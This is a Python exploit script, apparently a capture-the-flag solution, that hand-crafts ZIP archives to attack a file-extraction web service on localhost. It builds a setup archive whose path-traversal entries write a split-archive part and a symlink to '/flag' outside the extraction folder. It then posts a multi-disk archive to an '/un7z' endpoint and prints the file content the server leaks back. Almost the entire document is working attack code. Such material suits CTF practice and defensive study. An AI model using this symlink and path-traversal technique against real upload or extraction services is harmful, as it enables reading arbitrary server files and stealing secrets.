# Some inspiration taken from https://blog.hexf.me/uoftctf25_simple_file_storage

from hashlib import sha256
import struct
import zlib
import requests
import zipfile
from io import BytesIO

ZIP_VER = 20


def zipcrc(data: bytes):
    return zlib.crc32(data)


def p32(data: int):
    return struct.pack("<L", data)


def p16(data: int):
    return struct.pack("<H", data)


class File:
    name: bytes
    data: bytes
    crc: int
    extra_fields_fh: dict[int, bytes]
    extra_fields_cdh: dict[int, bytes]
    attrs: int

    def __init__(
        self,
        name: bytes,
        data: bytes,
        extra_fields_fh: dict[int, bytes],
        extra_fields_cdh: dict[int, bytes],
        attrs: int,
    ):
        self.name = name
        self.data = data
        self.crc = zipcrc(self.data)
        self.extra_fields_fh = extra_fields_fh
        self.extra_fields_cdh = extra_fields_cdh
        self.attrs = attrs

    def extra_fields_data(self, ef: dict[int, bytes]):
        res_e = b""
        for field_id in ef:
            res_e += p16(field_id)  # Field id
            res_e += p16(len(ef[field_id]))  # Field length
            res_e += ef[field_id]  # Field data

        return res_e

    def local_file_header(self):
        result = b""
        result += p32(0x04034B50)  # Signature
        result += p16(0x000A)  # Version needed to extract
        result += p16(0)  # Flags
        result += p16(0)  # Compression
        result += p16(0x6B61)  # Mod time
        result += p16(0x5AAD)  # Mod date
        result += p32(self.crc)  # Checksum
        result += p32(len(self.data))  # Compressed size
        result += p32(len(self.data))  # Uncompressed size
        result += p16(len(self.name))  # File name length

        res_e = self.extra_fields_data(self.extra_fields_fh)
        result += p16(len(res_e))  # Extra field len

        result += self.name  # File name
        result += res_e  # Extra fields

        return result

    def cd_file_header(self, lfh_offset: int, disk_num: int):
        result = b""
        result += p32(0x02014B50)
        result += p16(0x031E)  # Version
        result += p16(0x000A)  # Version needed to extract
        result += p16(0)  # Flags
        result += p16(0)  # Compression
        result += p16(0x6B61)  # Mod time
        result += p16(0x5AAD)  # Mod date
        result += p32(self.crc)  # Checksum
        result += p32(len(self.data))  # Compressed size
        result += p32(len(self.data))  # Uncompressed size
        result += p16(len(self.name))  # File name length

        res_e = self.extra_fields_data(self.extra_fields_cdh)
        result += p16(len(res_e))  # Extra field length

        result += p16(0)  # File comment length
        result += p16(disk_num)  # Disk number
        result += p16(1)  # Internal attr
        result += p32(self.attrs << 16)  # External attr
        result += p32(lfh_offset)  # Local file header offset (from start of FIRST disk)

        result += self.name
        result += res_e  # Extra field
        result += b""  # File comment

        return result


def make_eocd(
    num_disk_files: int,
    num_files: int,
    cd_size: int,
    cd_offset_wrt_disk: int,
    disk_num: int,
    cd_disk_num: int,
):
    result = b""
    result += p32(0x06054B50)  # Signature
    result += p16(disk_num)  # Disk number
    result += p16(cd_disk_num)  # Number of the disk on which CD starts (not EOCD)
    result += p16(num_disk_files)  # Disk entries
    result += p16(num_files)  # Total entries
    result += p32(cd_size)  # CD size
    result += p32(cd_offset_wrt_disk)  # CD offset (relative to start of CD disk)

    result += p16(0)  # Comment length
    result += b""  # Comment

    return result



final01 = b""  # Disk 0 (.z01)
# Disk 1 will be our symlink (.z02)
finalmain = b""  # Disk 2 (.zip)

FINAL_DISK_NUM = 2
myf = File(
    b"test.txt",
    b" " * 1024,
    {},
    {},
    0o0100644,  # see https://unix.stackexchange.com/questions/14705/the-zip-formats-external-file-attribute
)
final01 += myf.local_file_header()

finalmain += b" " * 1024
cd_pos = len(finalmain)

cd = b""
cd += myf.cd_file_header(0, 0)
finalmain += cd

disk_num = FINAL_DISK_NUM
cd_disk_num = FINAL_DISK_NUM
num_disk_cds = 1
total_cds = 1

finalmain += make_eocd(num_disk_cds, total_cds, len(cd), cd_pos, disk_num, cd_disk_num)

final_file_name = sha256(finalmain).hexdigest()

z01f = File(f"../{final_file_name}.z01".encode(), final01, {}, {}, 0o0100644)
z02f = File(f"../{final_file_name}.z02".encode(), b"/flag", {}, {}, 0o0120644) # This is a symlink

setupzip = b""
z01f_offset = len(setupzip)
setupzip += z01f.local_file_header() + z01f.data
z02f_offset = len(setupzip)
setupzip += z02f.local_file_header() + z02f.data
cd_offset = len(setupzip)
cd = b""
cd += z01f.cd_file_header(z01f_offset, 0)
cd += z02f.cd_file_header(z02f_offset, 0)
setupzip += cd
setupzip += make_eocd(2, 2, len(cd), cd_offset, 0, 0)

requests.post("http://localhost:8000/unzip", files={"zipfile": setupzip})
data = requests.post("http://localhost:8000/un7z", files={"zipfile": finalmain}).content


zf = zipfile.ZipFile(BytesIO(data))
print(zf.read(zf.namelist()[1]).decode().strip())
